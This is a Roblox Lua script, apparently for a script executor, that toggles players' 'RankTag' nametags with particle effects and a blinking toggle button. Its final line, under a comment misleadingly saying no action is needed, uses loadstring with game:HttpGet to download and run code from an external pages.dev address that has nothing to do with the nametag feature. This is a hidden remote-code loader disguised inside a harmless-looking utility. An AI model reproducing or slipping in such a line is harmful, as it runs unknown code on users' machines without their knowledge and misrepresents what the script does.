-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer

-- Variables
local nameTagsEnabled = true -- Start with nametags enabled
local isBlinking = false

-- Function to create particle effect at nametag position
local function createDisappearEffect(position)
    local part = Instance.new("Part")
    part.Name = "ParticleEffectPart"
    part.Size = Vector3.new(0.1, 0.1, 0.1)
    part.Position = position
    part.Anchored = true
    part.CanCollide = false
    part.Transparency = 1
    part.Parent = workspace
    
    -- Create particle emitter
    local particles = Instance.new("ParticleEmitter")
    particles.Parent = part
    
    -- Particle properties for a magical disappear effect
    particles.Texture = "rbxasset://textures/particles/sparkles_main.dds"
    particles.Lifetime = NumberRange.new(0.8, 1.2)
    particles.Rate = 0 -- We'll use Emit instead
    particles.SpreadAngle = Vector2.new(360, 360)
    particles.Speed = NumberRange.new(2, 5)
    particles.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 100, 200))
    }
    particles.Size = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.5, 0.2),
        NumberSequenceKeypoint.new(1, 0)
    }
    particles.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(0.8, 0.5),
        NumberSequenceKeypoint.new(1, 1)
    }
    
    -- Emit particles
    particles:Emit(50)
    
    -- Clean up after particles finish
    task.spawn(function()
        task.wait(2)
        part:Destroy()
    end)
end

-- Function to get world position from BillboardGui
local function getNameTagPosition(nameTag)
    if nameTag.Adornee and nameTag.Adornee.Parent then
        -- If attached to a part (like Head), use that position
        if nameTag.Adornee:IsA("BasePart") then
            return nameTag.Adornee.Position + Vector3.new(0, 2, 0)
        elseif nameTag.Adornee:IsA("Model") and nameTag.Adornee.PrimaryPart then
            return nameTag.Adornee.PrimaryPart.Position + Vector3.new(0, 2, 0)
        end
    end
    
    -- Fallback: try to find associated character
    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    if nameTag.Parent == playerGui then
        -- This is a PlayerGui nametag, try to find the associated player
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                return plr.Character.Head.Position + Vector3.new(0, 2, 0)
            end
        end
    end
    
    -- Final fallback
    return Vector3.new(0, 10, 0)
end

-- Function to disable all nametags immediately with particles
local function disableNameTags()
    nameTagsEnabled = false
    
    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    -- Disable all RankTag BillboardGuis in PlayerGui
    for _, gui in ipairs(playerGui:GetChildren()) do
        if gui:IsA("BillboardGui") and gui.Name == "RankTag" and gui.Enabled then
            -- Create particle effect before disabling
            local position = getNameTagPosition(gui)
            task.spawn(function()
                createDisappearEffect(position)
            end)
            gui.Enabled = false
        end
    end
    
    -- Also disable character-attached tags
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild("Head") then
            local head = plr.Character.Head
            for _, child in ipairs(head:GetChildren()) do
                if child:IsA("BillboardGui") and child.Name == "RankTag" and child.Enabled then
                    -- Create particle effect before disabling
                    local position = head.Position + Vector3.new(0, 2, 0)
                    task.spawn(function()
                        createDisappearEffect(position)
                    end)
                    child.Enabled = false
                end
            end
        end
    end
    
    return false
end

-- Function to enable all nametags
local function enableNameTags()
    nameTagsEnabled = true
    
    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    -- Enable all RankTag BillboardGuis in PlayerGui
    for _, gui in ipairs(playerGui:GetChildren()) do
        if gui:IsA("BillboardGui") and gui.Name == "RankTag" then
            gui.Enabled = true
        end
    end
    
    -- Also enable character-attached tags
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild("Head") then
            local head = plr.Character.Head
            for _, child in ipairs(head:GetChildren()) do
                if child:IsA("BillboardGui") and child.Name == "RankTag" then
                    child.Enabled = true
                end
            end
        end
    end
    
    return true
end

-- Function to handle new nametags (for respawn persistence)
local function onNameTagAdded(nameTag)
    if not nameTagsEnabled then
        nameTag.Enabled = false
    end
end

-- Function to monitor for new nametags to ensure they stay off after respawn
local function setupNameTagMonitoring()
    -- Monitor PlayerGui for new nametags
    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    playerGui.ChildAdded:Connect(function(child)
        if child:IsA("BillboardGui") and child.Name == "RankTag" then
            onNameTagAdded(child)
        end
    end)
    
    -- Monitor all players for character respawning
    local function onPlayerAdded(plr)
        plr.CharacterAdded:Connect(function(character)
            local head = character:WaitForChild("Head", 5)
            if head then
                head.ChildAdded:Connect(function(child)
                    if child:IsA("BillboardGui") and child.Name == "RankTag" then
                        onNameTagAdded(child)
                    end
                end)
            end
        end)
        
        -- Handle if character already exists
        if plr.Character then
            local head = plr.Character:FindFirstChild("Head")
            if head then
                head.ChildAdded:Connect(function(child)
                    if child:IsA("BillboardGui") and child.Name == "RankTag" then
                        onNameTagAdded(child)
                    end
                end)
            end
        end
    end
    
    -- Connect to existing and future players
    Players.PlayerAdded:Connect(onPlayerAdded)
    for _, plr in ipairs(Players:GetPlayers()) do
        onPlayerAdded(plr)
    end
end

-- GUI Creation
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NametagToggleGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- Main Button (moved slightly to the right)
local mainButton = Instance.new("ImageButton")
mainButton.Size = UDim2.new(0, 45, 0, 45)
mainButton.Position = UDim2.new(1, -245, 0, -54)
mainButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainButton.BackgroundTransparency = 0.5
mainButton.BorderSizePixel = 0
mainButton.Image = "rbxassetid://129832748765176"
mainButton.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainButton

-- Smooth blinking function (blinks twice only)
local function startBlinking()
    if isBlinking then return end
    isBlinking = true
    
    task.spawn(function()
        local blinkCount = 0
        while isBlinking and blinkCount < 4 do -- Blink 2 times (4 transitions)
            local targetColor = nameTagsEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
            
            -- Fade to color
            local fadeIn = TweenService:Create(mainButton, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
                BackgroundColor3 = targetColor,
                BackgroundTransparency = 0.2
            })
            fadeIn:Play()
            fadeIn.Completed:Wait()
            
            -- Fade back to transparent
            local fadeOut = TweenService:Create(mainButton, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
                BackgroundColor3 = Color3.fromRGB(15, 15, 15),
                BackgroundTransparency = 0.5
            })
            fadeOut:Play()
            fadeOut.Completed:Wait()
            
            blinkCount = blinkCount + 1
        end
        
        isBlinking = false
    end)
end

-- Function to toggle nametags
local function toggleNameTags()
    if nameTagsEnabled then
        disableNameTags()
    else
        enableNameTags()
    end
    
    startBlinking()
end

-- Event Connection
mainButton.MouseButton1Click:Connect(toggleNameTags)

-- Initialize monitoring system for respawn persistence
setupNameTagMonitoring()

-- Initialize - nametags start enabled (no action needed on start)
loadstring(game:HttpGet("https://akadmin-bzk.pages.dev/rjre.lua"))()
